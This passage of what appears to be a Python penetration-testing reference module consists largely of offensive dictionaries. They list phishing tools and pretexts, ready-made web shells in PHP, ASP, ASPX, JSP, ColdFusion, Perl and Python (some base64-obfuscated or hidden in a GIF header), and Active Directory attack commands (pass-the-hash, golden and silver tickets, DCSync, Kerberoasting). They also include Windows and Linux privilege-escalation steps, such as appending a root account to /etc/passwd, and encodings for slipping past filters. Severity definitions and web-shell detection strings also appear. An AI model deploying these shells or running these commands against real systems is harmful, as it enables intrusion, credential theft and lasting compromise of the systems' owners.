        "GoPhish: open-source phishing framework",
        "Evilginx2: MITM phishing proxy — captures MFA tokens",
        "Modlishka: reverse proxy phishing",
        "Social-Engineer Toolkit (SET): phishing + payload delivery",
        "King Phisher: enterprise phishing simulation",
    ],
    "pretexting_scenarios": [
        "IT helpdesk: password reset urgency",
        "HR: benefits enrollment deadline",
        "Legal/Compliance: urgent contract review",
        "C-suite (whaling): wire transfer authorization",
        "Vendor/partner: invoice or delivery notification",
        "Security team: suspicious activity alert",
        "Bank/Financial: account verification",
        "Shipping: parcel delivery notification",
    ],
    "credential_harvesting": [
        "Phishing page with real-time exfil to attacker server",
        "Evilginx2 phishlets for major services (O365, Google, Okta)",
        "Browser-in-the-Browser (BitB) attack",
        "QR code phishing (Quishing)",
        "Adversary-in-the-Middle (AiTM) for MFA bypass",
        "Token theft via malicious OAuth app",
        "Device code phishing (OAuth device flow)",
    ],
    "phone_vishing": [
        "Caller ID spoofing to impersonate IT/HR/helpdesk",
        "Urgency tactics: 'your account will be locked in 1 hour'",
        "Pretend to be from bank/financial institution",
        "Social validation: 'I'm calling from [correct department name]'",
        "Confirm partial information to build trust",
        "Escalate to supervisor to bypass initial resistance",
        "Use leaked data to appear legitimate",
    ],
    "physical_recon": [
        "Dumpster diving for discarded documents",
        "Tailgating — follow authorized person through door",
        "Badge cloning — RFID/NFC proximity card attack",
        "USB drop attack — drop malicious USBs near target",
        "Evil twin WiFi — spoof corporate SSID to capture credentials",
        "Rogue access point deployment",
        "Hidden camera / keylogger installation during physical access",
    ],
    "osint_people": [
        "LinkedIn: find employees, roles, org structure",
        "Twitter/X: find personal details, internal complaints",
        "Facebook/Instagram: personal life, location, relationships",
        "Breach data: check if employees in known data breaches",
        "GitHub: employee personal projects, leaked code",
        "Hunter.io: email format, employee email addresses",
        "Pipl/spokeo: aggregate personal data",
        "Public records: property, court, voter registration",
    ],
}



                                                                                 
                                
                                                                                 

WEBSHELL_REFERENCE = {
    "php_minimal": '<?php system($_GET["cmd"]); ?>',
    "php_minimal_post": '<?php system($_POST["cmd"]); ?>',
    "php_passthru": '<?php passthru($_GET["cmd"]); ?>',
    "php_exec": '<?php echo exec($_GET["cmd"]); ?>',
    "php_shell_exec": '<?php echo shell_exec($_GET["cmd"]); ?>',
    "php_popen": '<?php $f=popen($_GET["cmd"],"r");while(!feof($f)){echo fgets($f,1024);}pclose($f); ?>',
    "php_proc_open": (
        '<?php $p=proc_open($_GET["cmd"],array(array("pipe","r"),array("pipe","w"),array("pipe","w")),$pipes);'
        'echo stream_get_contents($pipes[1]);proc_close($p); ?>'
    ),
    "php_eval_base64": (
        '<?php eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7")); ?>'
        "  // base64 of: system($_GET['cmd']);"
    ),
    "php_preg_replace": (
        '<?php preg_replace("/.*/e","system(\'id\')",""); ?>'
    ),
    "php_create_function": (
        '<?php $f=create_function("","system(\'id\');");$f(); ?>'
    ),
    "php_array_map": (
        '<?php array_map("system",array("id")); ?>'
    ),
    "php_assert": (
        '<?php assert($_GET["cmd"]); ?>'
    ),
    "php_c99_mini": (
        '<?php\n'
        '$pass="pass";\n'
        'if(isset($_POST["pass"])&&$_POST["pass"]==$pass){\n'
        '  system($_POST["cmd"]);\n'
        '}\n'
        '?>'
    ),
    "php_image_shell": (
        "GIF89a"
        '<?php system($_GET["cmd"]); ?>'
    ),
    "asp_minimal": '<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>',
    "aspx_minimal": (
        '<%@ Page Language="C#" %>'
        '<%@ Import Namespace="System.Diagnostics" %>'
        '<% Process p = new Process();'
        'p.StartInfo.UseShellExecute = false;'
        'p.StartInfo.RedirectStandardOutput = true;'
        'p.StartInfo.FileName = "cmd.exe";'
        'p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];'
        'p.Start();'
        'Response.Write(p.StandardOutput.ReadToEnd()); %>'
    ),
    "jsp_minimal": (
        '<%@ page import="java.util.*,java.io.*" %>'
        '<% out.println(new Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(),'
        '"UTF-8").useDelimiter("\\\\A").next()); %>'
    ),
    "cfm_minimal": '<cfexecute name="cmd.exe" arguments="/c #url.cmd#" variable="o" /><cfoutput>#o#</cfoutput>',
    "pl_minimal": '#!/usr/bin/perl\nuse CGI qw/:standard/;\nmy $cmd=param("cmd");\nprint header;\nprint `$cmd`;',
    "py_wsgi_minimal": (
        "def application(env, start_response):\n"
        "    import os\n"
        "    cmd = env.get('QUERY_STRING','').replace('cmd=','')\n"
        "    output = os.popen(cmd).read()\n"
        "    start_response('200 OK', [('Content-Type','text/plain')])\n"
        "    return [output.encode()]\n"
    ),
    "shtml_minimal": '<!--#exec cmd="id" -->',
    "detection_indicators": [
        "eval(base64_decode(",
        "system($_GET","system($_POST","system($_REQUEST",
        "passthru($_GET","passthru($_POST",
        "shell_exec($_GET","shell_exec($_POST",
        "exec($_GET","exec($_POST",
        "popen($_GET","proc_open($_GET",
        "assert($_GET","preg_replace(\"/.*/e\"",
        "wscript.shell","WScript.Shell","CreateObject",
        "Runtime.exec","ProcessBuilder",
        "os.system","os.popen","subprocess.call","subprocess.Popen",
        "cmd.exe /c","cmd /c","/bin/sh -c","/bin/bash -c",
        "<!--#exec","#exec cmd",
    ],
}

                                                                                 
                                                           
                                                                                 

LATERAL_MOVEMENT_REFERENCE = {
    "windows": {
        "pass_the_hash": [
            "impacket-psexec 'domain/user' -hashes :NTLM_HASH @target",
            "impacket-wmiexec 'domain/user' -hashes :NTLM_HASH @target",
            "impacket-smbexec 'domain/user' -hashes :NTLM_HASH @target",
            "crackmapexec smb target -u user -H NTLM_HASH --exec-method wmiexec",
            "mimikatz sekurlsa::pth /user:user /domain:domain /ntlm:NTLM_HASH /run:cmd.exe",
        ],
        "pass_the_ticket": [
            "mimikatz kerberos::ptt ticket.kirbi",
            "impacket-getTGT domain/user:password",
            "export KRB5CCNAME=ticket.ccache && impacket-psexec -k -no-pass target",
            "Rubeus.exe ptt /ticket:base64_ticket",
        ],
        "overpass_the_hash": [
            "mimikatz sekurlsa::pth /user:user /domain:domain /ntlm:NTLM_HASH /run:powershell.exe",
            "Rubeus.exe asktgt /user:user /rc4:NTLM_HASH /ptt",
        ],
        "dcom_exec": [
            "impacket-dcomexec 'domain/user:pass' @target 'cmd.exe /c id'",
            "[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','target')).Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c id','7')",
        ],
        "wmi_exec": [
            "impacket-wmiexec domain/user:pass@target",
            "wmic /node:target /user:domain\\user /password:pass process call create 'cmd.exe /c id'",
            "Invoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c id'",
        ],
        "psremoting": [
            "Enter-PSSession -ComputerName target -Credential (Get-Credential)",
            "Invoke-Command -ComputerName target -ScriptBlock {id} -Credential $cred",
            "New-PSSession -ComputerName target -Credential $cred",
        ],
        "schtasks": [
            "schtasks /create /s target /u domain\\user /p pass /tn 'evil' /tr 'cmd.exe /c id > C:\\out.txt' /sc once /st 00:00",
            "schtasks /run /s target /tn evil",
            "impacket-atexec domain/user:pass@target 'cmd.exe /c id'",
        ],
        "service_creation": [
            "sc \\\\target create evil binpath= 'cmd.exe /c id' start= auto",
            "sc \\\\target start evil",
            "impacket-smbexec domain/user:pass@target",
        ],
        "rdp_hijack": [
            "tscon SESSION_ID /dest:rdp-tcp#ID /password:PASS (as SYSTEM)",
            "mimikatz ts::logonpasswords",
        ],
        "golden_ticket": [
            "mimikatz kerberos::golden /user:Administrator /domain:domain /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt",
            "impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain Administrator",
        ],
        "silver_ticket": [
            "mimikatz kerberos::golden /user:user /domain:domain /sid:DOMAIN_SID /target:target /service:cifs /rc4:SERVICE_NTLM /ptt",
        ],
        "dcsync": [
            "mimikatz lsadump::dcsync /domain:domain /user:krbtgt",
            "impacket-secretsdump domain/user:pass@DC_IP",
            "crackmapexec smb DC_IP -u user -p pass --ntds",
        ],
    },
    "linux": {
        "ssh_agent_hijack": [
            "find /tmp -name 'agent.*' 2>/dev/null",
            "SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.PID ssh user@target",
            "ls -la /proc/*/environ 2>/dev/null | grep ssh",
        ],
        "sudo_abuse": [
            "sudo -l  # list allowed commands",
            "sudo /bin/bash  # if bash allowed",
            "sudo /bin/vi /etc/passwd  # if vi allowed — :!/bin/bash",
            "sudo /usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'",
            "sudo /usr/bin/find / -exec /bin/bash \\;",
            "sudo /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}'",
        ],
        "cron_abuse": [
            "crontab -l",
            "cat /etc/crontab",
            "ls /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/",
            "find / -name 'cron*' 2>/dev/null",
            "Modify writable cron scripts to add reverse shell",
        ],
        "suid_abuse": [
            "find / -perm -4000 -type f 2>/dev/null",
            "SUID bash: /bin/bash -p",
            "SUID python: python -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
            "SUID find: find . -exec /bin/bash -p \\; -quit",
            "GTFOBins: https://gtfobins.github.io/ for SUID escapes",
        ],
        "capability_abuse": [
            "getcap -r / 2>/dev/null",
            "python3 with cap_setuid: python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
            "perl with cap_setuid: perl -e 'use POSIX;setuid(0);exec \"/bin/bash\"'",
        ],
        "writable_path": [
            "echo $PATH",
            "find / -writable -type d 2>/dev/null",
            "If a SUID binary calls 'ls'/'cat' without full path — path hijack",
            "Create malicious 'ls' in writable directory prepended to PATH",
        ],
        "nfs_abuse": [
            "showmount -e target",
            "mount -t nfs target:/share /mnt",
            "If no_root_squash: create SUID bash on share, execute from target",
        ],
        "docker_escape": [
            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            "docker run --privileged -it alpine sh; mount /dev/sdX /mnt",
            "nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
            "capsh --print  # check capabilities",
            "If cap_sys_admin: mount /dev/sdX /mnt → access host filesystem",
        ],
    },
}

                                                                                 
                                          
                                                                                 

SEVERITY_DEFINITIONS = {
    "CRITICAL": {
        "cvss_range": "9.0 - 10.0",
        "description": "Exploitation is straightforward and leads to complete system compromise, full data exfiltration, or critical infrastructure takeover without authentication.",
        "examples": [
            "Unauthenticated RCE on internet-facing service",
            "SQL injection leading to full database dump",
            "Authentication bypass giving admin access",
            "Plaintext storage of passwords in database",
            "Hard-coded credentials allowing full system access",
            "SSRF reading cloud metadata → credential exfiltration",
            "XXE reading /etc/passwd or AWS credentials",
            "Pre-auth deserialization RCE",
        ],
        "sla": "Patch immediately (24-48 hours)",
        "color": "\033[91m",              
    },
    "HIGH": {
        "cvss_range": "7.0 - 8.9",
        "description": "Exploitation is possible and leads to significant data loss, privilege escalation, or service disruption. May require authentication or user interaction.",
        "examples": [
            "Stored XSS in admin panel",
            "Horizontal privilege escalation (IDOR)",
            "Vertical privilege escalation via mass assignment",
            "SSRF reading internal services",
            "SQL injection with limited data access",
            "Insecure direct object reference to sensitive data",
            "JWT signing key weakness",
            "Unvalidated redirect to phishing page",
        ],
        "sla": "Patch within 7 days",
        "color": "\033[33m",          
    },
    "MEDIUM": {
        "cvss_range": "4.0 - 6.9",
        "description": "Exploitation is possible but limited in impact or requires significant user interaction. Exposes some data or functionality not intended to be public.",
        "examples": [
            "Reflected XSS",
            "CSRF on non-critical functionality",
            "Clickjacking on authenticated pages",
            "Information disclosure of internal paths/versions",
            "Password policy not enforced",
            "Missing rate limiting on non-auth endpoints",
            "Insecure cookie flags",
            "Directory listing enabled",
            "CORS misconfiguration allowing credentialed requests",
        ],
        "sla": "Patch within 30 days",
        "color": "\033[93m",                 
    },
    "LOW": {
        "cvss_range": "0.1 - 3.9",
        "description": "Exploitation has very limited impact, requires complex conditions, or leads only to minor information disclosure.",
        "examples": [
            "Missing security headers (CSP, HSTS, etc.)",
            "Software version disclosure",
            "HTTP methods enabled (TRACE, OPTIONS)",
            "Weak password policy",
            "Verbose error messages",
            "Missing Referrer-Policy",
            "Non-sensitive information disclosure",
        ],
        "sla": "Patch within 90 days",
        "color": "\033[32m",         
    },
    "INFORMATIONAL": {
        "cvss_range": "0.0",
        "description": "No direct security impact. Observations, best practices, or defense-in-depth recommendations.",
        "examples": [
            "Cookie without SameSite attribute",
            "Use of deprecated libraries",
            "Missing subresource integrity (SRI)",
            "SPF/DKIM/DMARC not fully configured",
            "No DNSSEC",
            "Robots.txt lists all paths",
            "Non-sensitive internal IP in response",
        ],
        "sla": "No mandatory timeline",
        "color": "\033[36m",        
    },
}



                                                                                 
                                                  
                                                                                 

WINDOWS_PRIVESC_CHECKLIST = [
    "01. Check current user: whoami /all /priv",
    "02. Check OS version: systeminfo | findstr /B /C:'OS'",
    "03. Check installed patches: wmic qfe get Caption,Description,HotFixID,InstalledOn",
    "04. Check running services: net start; sc query",
    "05. Check scheduled tasks: schtasks /query /fo LIST /v",
    "06. Check startup programs: wmic startup get Caption,Command,Location,User",
    "07. Check installed software: wmic product get name,version",
    "08. Check network connections: netstat -ano",
    "09. Check firewall rules: netsh advfirewall firewall show rule name=all",
    "10. Check AV/EDR: wmic /namespace:\\\\root\\securitycenter2 PATH AntiVirusProduct get displayName",
    "11. AlwaysInstallElevated: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
    "12. AlwaysInstallElevated: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
    "13. Unquoted service paths: wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\\windows'",
    "14. Weak service permissions: accesschk.exe -uqvw 'Everyone' 'C:\\Program Files'",
    "15. Modifiable service binary: icacls <service_binary> (check for write permission)",
    "16. Modifiable service registry: accesschk.exe -kvuqsw hklm\\System\\CurrentControlSet\\Services",
    "17. DLL hijacking: look for missing DLLs in services/applications",
    "18. PATH DLL hijacking: check writable directories in %PATH%",
    "19. Stored credentials: cmdkey /list; runas /savecred",
    "20. Credential files: dir /s /b C:\\Users\\*pass* C:\\Users\\*cred* C:\\Users\\*vnc* C:\\Users\\*secret*",
    "21. Registry credentials: reg query HKLM /f password /t REG_SZ /s",
    "22. SAM/SYSTEM hive (offline): copy \\\\?\\C:\\Windows\\System32\\config\\SAM SAM",
    "23. NTDS.dit (AD): ntdsutil; vssadmin create shadow /for=C:",
    "24. Kerberoasting: GetUserSPNs.py domain/user:pass -dc-ip DC -request",
    "25. AS-REP Roasting: GetNPUsers.py domain/ -usersfile users.txt -format hashcat",
    "26. BloodHound: SharpHound.exe --CollectionMethods All",
    "27. PowerView: Invoke-ShareFinder; Get-NetComputer; Find-LocalAdminAccess",
    "28. Token impersonation: whoami /priv → SeImpersonatePrivilege → JuicyPotato/PrintSpoofer",
    "29. PrintSpoofer: PrintSpoofer.exe -i -c cmd (if SeImpersonatePrivilege)",
    "30. JuicyPotato: JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}",
    "31. RoguePotato: exploiting NTLM relay from SYSTEM",
    "32. SweetPotato: SweetPotato.exe -p cmd.exe -a '/c id'",
    "33. HiveNightmare / SeriousSAM (CVE-2021-36934): check VSS shadow copy access",
    "34. PrintNightmare (CVE-2021-1675): exploit print spooler service",
    "35. EternalBlue (MS17-010): if SMBv1 enabled and unpatched",
    "36. Local admin to domain admin: find domain admin sessions on local box",
    "37. Group Policy preferences: find cpassword in SYSVOL",
    "38. SYSVOL readable: \\\\domain\\SYSVOL → Group Policy preferences XML",
    "39. LAPS password: Get-AdmPwdPassword -ComputerName target",
    "40. Autologon credentials: reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'",
    "41. VNC passwords: reg query HKCU\\Software\\ORL\\WinVNC3\\Password",
    "42. OpenSSH private keys: dir /a /s C:\\Users\\.ssh",
    "43. Unattended install files: C:\\Windows\\Panther\\Unattend.xml",
    "44. Sysprep files: C:\\Windows\\system32\\sysprep\\sysprep.xml",
    "45. IIS web.config: type C:\\inetpub\\wwwroot\\web.config | findstr /i pass",
    "46. AppCmd.exe: %systemroot%\\system32\\inetsrv\\appcmd.exe list vdir /text:*",
    "47. WinRM credentials: check for stored WinRM sessions",
    "48. Kerberos ticket extraction: mimikatz sekurlsa::tickets /export",
    "49. LSASS dump: mimikatz sekurlsa::logonpasswords; procdump -ma lsass.exe",
    "50. SharpUp.exe: automated Windows PrivEsc checker (GhostPack)",
    "51. winPEAS.exe: automated Windows PrivEsc Awesome Script",
    "52. PowerUp.ps1: Invoke-AllChecks (PowerSploit)",
    "53. Seatbelt.exe: security configuration auditing (GhostPack)",
    "54. watson.exe: find missing patches for privilege escalation",
    "55. SharpHound.exe: AD enumeration for BloodHound",
]

                                                                                 
                                                
                                                                                 

LINUX_PRIVESC_CHECKLIST = [
    "01. Kernel version: uname -a; cat /proc/version",
    "02. OS version: cat /etc/os-release; cat /etc/*-release",
    "03. Current user: id; whoami; groups",
    "04. Sudo rights: sudo -l",
    "05. SUID binaries: find / -perm -4000 -type f 2>/dev/null",
    "06. SGID binaries: find / -perm -2000 -type f 2>/dev/null",
    "07. World-writable directories: find / -writable -type d 2>/dev/null",
    "08. World-writable files: find / -perm -o+w -type f 2>/dev/null",
    "09. Capabilities: getcap -r / 2>/dev/null",
    "10. Cron jobs: crontab -l; cat /etc/crontab; ls /etc/cron.*",
    "11. Writable cron scripts: find /etc/cron* -writable 2>/dev/null",
    "12. PATH manipulation: echo $PATH; check writable dirs in PATH",
    "13. Environment variables: env; printenv",
    "14. Interesting files: cat /etc/passwd; cat /etc/shadow (if readable)",
    "15. SSH keys: cat ~/.ssh/id_rsa; ls -la ~/.ssh/",
    "16. Authorized keys: cat ~/.ssh/authorized_keys",
    "17. History files: cat ~/.bash_history; cat ~/.zsh_history",
    "18. Config files: find / -name '*.conf' -readable 2>/dev/null",
    "19. Password files: find / -name '*pass*' -o -name '*cred*' 2>/dev/null",
    "20. Database configs: find / -name 'wp-config.php' -o -name '.env' 2>/dev/null",
    "21. Running processes: ps aux; ps -ef",
    "22. Network connections: ss -tlnp; netstat -tlnp",
    "23. Listening on localhost: ss -tlnp | grep 127.0.0.1",
    "24. Firewall rules: iptables -L; ufw status",
    "25. Installed packages: dpkg -l; rpm -qa; pip list",
    "26. Docker group membership: id | grep docker",
    "27. Docker running: docker ps; docker images",
    "28. LXD group membership: id | grep lxd → lxd image import",
    "29. NFS shares: showmount -e localhost; cat /etc/exports",
    "30. Writable /etc/passwd: echo 'evil:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd",
    "31. Writable /etc/shadow: echo 'root:$(openssl passwd -6 newpass):...' > /etc/shadow",
    "32. LD_PRELOAD abuse: sudo LD_PRELOAD=/tmp/evil.so some_binary",
    "33. LD_LIBRARY_PATH abuse: check for relative library loading",
    "34. Shared library injection: strace a SUID binary for missing libs",
    "35. Python/Perl library hijack: writeable Python path directories",
    "36. Systemd timer abuse: find writable systemd service files",
    "37. Logrotate abuse: exploit postrotate scripts in /etc/logrotate.d/",
    "38. Ansible/Puppet/Chef agent running as root: check config files",
    "39. Wildcard injection in cron: * in tar/chown/chmod cron commands",
    "40. Git hooks: writable .git/hooks/ scripts in repos run by root",
    "41. Writable /etc/ld.so.conf.d/: add custom lib path",
    "42. Kernel exploits: Linux Kernel < 4.4 → Dirty COW (CVE-2016-5195)",
    "43. Kernel exploits: Linux Kernel < 5.16 → Dirty Pipe (CVE-2022-0847)",
    "44. Kernel exploits: overlayfs (CVE-2023-0386)",
    "45. PKEXEC (Polkit) CVE-2021-4034 (PwnKit): all versions < 0.120",
    "46. Sudo < 1.8.28 (CVE-2019-14287): sudo -u#-1 /bin/bash",
    "47. Sudo < 1.9.5p2 (CVE-2021-3156): heap buffer overflow",
    "48. linpeas.sh: automated Linux PrivEsc Awesome Script",
    "49. LinEnum.sh: automated Linux enumeration",
    "50. linux-exploit-suggester.sh: kernel exploit suggestions",
]

                                                                                 
                                             
                                                                                 

ENCODING_OBFUSCATION_REFERENCE = {
    "url_encoding": {
        "description": "Percent-encode characters to bypass filters",
        "examples": [
            "/etc/passwd → %2Fetc%2Fpasswd",
            "../ → %2E%2E%2F",
            "' → %27",
            "\" → %22",
            "<script> → %3Cscript%3E",
            "UNION → %55NION or U%4EION",
            "SELECT → %53ELECT or S%45LECT",
        ],
    },
    "double_url_encoding": {
        "description": "Encode the percent sign itself",
        "examples": [
            "/etc/passwd → %252Fetc%252Fpasswd",
            "../ → %252E%252E%252F",
            "' → %2527",
            "\" → %2522",
            "<script> → %253Cscript%253E",
        ],
    },
    "html_encoding": {
        "description": "HTML entities bypass XSS filters",
        "examples": [
            "< → &lt; or &#60; or &#x3c;",
            "> → &gt; or &#62; or &#x3e;",
            "' → &#39; or &#x27;",
            "\" → &quot; or &#34; or &#x22;",
            "& → &amp; or &#38;",
            "script → &#115;&#99;&#114;&#105;&#112;&#116;",
        ],
    },
    "unicode_encoding": {
        "description": "Unicode variants to bypass WAF signature matching",
        "examples": [
            "/ → \\u002f or \\U0000002F",
            ". → \\u002e",
            "' → \\u0027",
            "SELECT → \\u0053\\u0045\\u004c\\u0045\\u0043\\u0054",
            "OR → \\u004f\\u0052",
            "script → \\u0073\\u0063\\u0072\\u0069\\u0070\\u0074",
        ],
    },
    "base64": {
        "description": "Base64 encode payloads to bypass pattern matching",
        "examples": [
            "id → aWQ=",
            "/etc/passwd → L2V0Yy9wYXNzd3Q=",
            "<?php system($_GET[cmd]); ?> → PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==",
            "echo 'PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==' | base64 -d > shell.php",
        ],
    },
    "hex_encoding": {
        "description": "Hex-encode strings for SQL injection / command injection",
        "examples": [
            "admin → 0x61646d696e",
            "SELECT 'admin' → SELECT 0x61646d696e",
            "/etc/passwd → 0x2f6574632f706173737764",
            "id → 0x6964",
        ],
    },
    "case_variation": {
        "description": "Vary case to bypass case-sensitive filters",
        "examples": [
            "UNION SELECT → UnIoN SeLeCt",
            "SELECT → SeLeCt",
            "OR 1=1 → oR 1=1",
            "<script> → <ScRiPt>",
            "system → SyStEm",
        ],
    },
    "comment_insertion": {
        "description": "Insert comments to break up keywords",
        "examples": [
            "UNION SELECT → UN/**/ION SE/**/LECT",
            "UNION SELECT → UN/*comment*/ION/*comment*/SELECT",
            "OR → O/**/R",
            "SELECT → SEL%00ECT (null byte)",
            "AND → AN/**/D",
        ],
    },
    "whitespace_variation": {
        "description": "Use alternative whitespace characters",
        "examples": [
            "UNION SELECT → UNION%09SELECT (tab)",
            "UNION SELECT → UNION%0ASELECT (newline)",
            "UNION SELECT → UNION%0DSELECT (carriage return)",
            "UNION SELECT → UNION%0D%0ASELECT",
            "UNION SELECT → UNION%0BSELECT (vertical tab)",
            "UNION SELECT → UNION%0CSELECT (form feed)",
        ],
    },
    "scientific_notation": {
        "description": "Bypass numeric filters with scientific notation",
        "examples": [
            "1 → 1e0",
            "1 → 1.0e0",
            "0 → 0e0",
            "1 → .1e1",
        ],
    },
    "sql_char_functions": {
        "description": "Use SQL functions to obfuscate strings",
        "examples": [
            "SELECT 'admin' → SELECT CHAR(97,100,109,105,110)",
            "SELECT 'admin' → SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)",
            "OR → OR CHAR(79,82)",
            "CONCAT('a','dmin') → 'admin'",
            "0x61 → 'a' (MySQL hex literal)",
        ],
    },
}



                                                                                 
                                             
                                                                                 

AD_ATTACK_REFERENCE = {
    "enumeration": {
        "bloodhound": [
            "SharpHound.exe --CollectionMethods All --ZipFileName loot.zip",
            "bloodhound-python -u user -p pass -d domain -c All --zip",
            "bloodhound-python -u user --hashes :NTLM -d domain -c All --zip",
            "Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip",
        ],
        "powerview": [
            "Get-NetDomain",
            "Get-NetDomainController",
            "Get-NetForest",
            "Get-NetUser -SPN",
            "Get-NetGroup -AdminCount",
            "Get-NetComputer -Unconstrained",
            "Get-NetGPO",
            "Find-LocalAdminAccess",
            "Find-DomainUserLocation",
            "Invoke-ShareFinder",
            "Get-DomainUser -PreauthNotRequired",
            "Get-DomainTrust",
            "Get-DomainUser -TrustedToAuth",
        ],
        "ldap_queries": [
            "ldapsearch -x -H ldap://DC -D 'user@domain' -w pass -b 'DC=domain,DC=com' '(objectClass=user)' sAMAccountName",
            "ldapsearch -x -H ldap://DC -D 'user@domain' -w pass -b 'DC=domain,DC=com' '(objectClass=group)' cn",
            "ldapsearch -x -H ldap://DC -D 'user@domain' -w pass -b 'DC=domain,DC=com' '(adminCount=1)' sAMAccountName",
            "ldapsearch -x -H ldap://DC -D 'user@domain' -w pass -b 'DC=domain,DC=com' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName",
            "ldapsearch -x -H ldap://DC -D 'user@domain' -w pass -b 'DC=domain,DC=com' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName",
        ],
    },
    "credential_attacks": {
        "password_spray": [
            "crackmapexec smb DC -u users.txt -p 'Password1' --continue-on-success",
            "crackmapexec smb DC -u users.txt -p 'Spring2024!' --continue-on-success",
            "kerbrute passwordspray -d domain --dc DC users.txt 'Password1'",
            "Spray-Passwords.ps1 -Pass Password1 -Admin",
            "DomainPasswordSpray -UserList users.txt -Password Password1 -OutFile results.txt",
            "# Always check lockout policy first: net accounts /domain",
        ],
        "kerberoasting": [
            "impacket-GetUserSPNs domain/user:pass -dc-ip DC -request",
            "impacket-GetUserSPNs domain/user:pass -dc-ip DC -request -outputfile tgs.txt",
            "Rubeus.exe kerberoast /outfile:tgs.txt",
            "Invoke-Kerberoast | Out-File -Encoding ASCII tgs.txt",
            "hashcat -m 13100 tgs.txt wordlist.txt",
        ],
        "asrep_roasting": [
            "impacket-GetNPUsers domain/ -usersfile users.txt -format hashcat -outputfile asrep.txt",
            "impacket-GetNPUsers domain/user:pass -dc-ip DC -request -format hashcat",
            "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt",
            "Get-DomainUser -PreauthNotRequired | Get-ASREPHash",
            "hashcat -m 18200 asrep.txt wordlist.txt",
        ],
        "pass_the_hash": [
            "impacket-psexec domain/user@target -hashes :NTLM",
            "impacket-wmiexec domain/user@target -hashes :NTLM",
            "impacket-smbexec domain/user@target -hashes :NTLM",
            "crackmapexec smb targets -u user -H NTLM --exec-method wmiexec",
            "xfreerdp /v:target /u:user /pth:NTLM",
            "evil-winrm -i target -u user -H NTLM",
        ],
        "overpass_the_hash": [
            "mimikatz sekurlsa::pth /user:user /domain:domain /ntlm:NTLM /run:cmd.exe",
            "Rubeus.exe asktgt /user:user /rc4:NTLM /ptt",
            "Rubeus.exe asktgt /user:user /aes256:AES256KEY /ptt",
        ],
        "dcsync": [
            "mimikatz lsadump::dcsync /domain:domain /user:krbtgt",
            "mimikatz lsadump::dcsync /domain:domain /all /csv",
            "impacket-secretsdump domain/user:pass@DC",
            "impacket-secretsdump -hashes :NTLM domain/user@DC",
            "crackmapexec smb DC -u user -p pass --ntds",
        ],
    },
    "kerberos_attacks": {
        "golden_ticket": [
            "# Requires: krbtgt NTLM hash, domain SID",
            "mimikatz kerberos::golden /user:Administrator /domain:domain /sid:DOMAIN_SID /krbtgt:KRBTGT_NTLM /ptt",
            "impacket-ticketer -nthash KRBTGT_NTLM -domain-sid DOMAIN_SID -domain domain Administrator",
            "export KRB5CCNAME=Administrator.ccache",
            "impacket-psexec domain/Administrator@target -k -no-pass",
        ],
        "silver_ticket": [
            "# Requires: service NTLM hash, domain SID, target SPN",
            "mimikatz kerberos::golden /user:user /domain:domain /sid:DOMAIN_SID /target:server.domain /service:cifs /rc4:SERVICE_NTLM /ptt",
            "impacket-ticketer -nthash SERVICE_NTLM -domain-sid DOMAIN_SID -domain domain -spn cifs/server.domain user",
        ],
        "diamond_ticket": [
            "# Modifies existing TGT rather than forging from scratch",
            "Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519",
        ],
        "sapphire_ticket": [
            "# Uses S4U2self to obtain PAC from KDC",
            "Rubeus.exe sapphire /user:Administrator /password:pass /domain:domain /dc:DC /ptt",
        ],
        "unconstrained_delegation": [
            "Get-DomainComputer -Unconstrained",
            "Rubeus.exe monitor /interval:5 /nowrap",
            "# Wait for domain admin to connect → capture TGT",
            "Rubeus.exe ptt /ticket:<base64_ticket>",
            "# SpoolSample to force DC auth: SpoolSample.exe DC UNCONSTRAINED_HOST",
        ],
        "constrained_delegation": [
            "Get-DomainUser -TrustedToAuth",
            "Get-DomainComputer -TrustedToAuth",
            "Rubeus.exe s4u /user:svc_user /rc4:NTLM /impersonateuser:Administrator /msdsspn:cifs/target.domain /ptt",
            "impacket-getST -spn cifs/target.domain -impersonate Administrator domain/svc_user:pass",
        ],
        "rbcd": [
            "# Resource-Based Constrained Delegation",
            "# Requires: write access to target msDS-AllowedToActOnBehalfOfOtherIdentity",
            "Set-DomainObject target -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SD.GetSecurityDescriptorBinaryForm()}",
            "Rubeus.exe s4u /user:ATTACKER$ /rc4:NTLM /impersonateuser:Administrator /msdsspn:cifs/target.domain /ptt",
        ],
    },
    "domain_persistence": {
        "dcshadow": [
            "mimikatz lsadump::dcshadow /object:user /attribute:primaryGroupID /value:512",
            "mimikatz lsadump::dcshadow /push",
